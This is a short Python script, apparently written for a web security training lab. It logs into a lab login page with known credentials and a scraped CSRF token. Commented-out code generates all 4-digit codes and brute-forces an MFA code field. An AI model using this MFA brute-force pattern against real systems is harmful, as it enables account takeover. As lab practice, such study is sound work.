# file = open('4-digit.txt', 'w')
# for i in range(10000):
#     if i<10:
#         file.write('000'+str(i)+'\n')
#     elif i <100:
#         file.write('00'+str(i)+'\n')
#     elif i < 1000:
#         file.write('0'+str(i)+'\n')
#     else:
#         file.write(str(i)+'\n')

import requests
from tqdm import tqdm
from bs4 import BeautifulSoup
file = open('4-digit.txt', 'r').read().splitlines()
url = 'https://0ae300a10476d213c46c348000a700d6.web-security-academy.net'

# for i in tqdm(file):
#     res = requests.post(url,data = {'mfa-code':i})
#     if 'Your username is' in res.text:
#         print(i)
#         break
s = requests.Session()
getRes = s.get(url+'/login')

soup = BeautifulSoup(getRes.text, 'lxml')

data = {
    'csrf': soup.find('input',{'name':'csrf'})['value'],
    'username': 'carlos',
    'password': 'montoya'
}

postRes = s.post(url+'/login',data = data)
print(postRes.cookies)
# print(soup.find('input',{'name':'csrf'})['value'])
# print(data)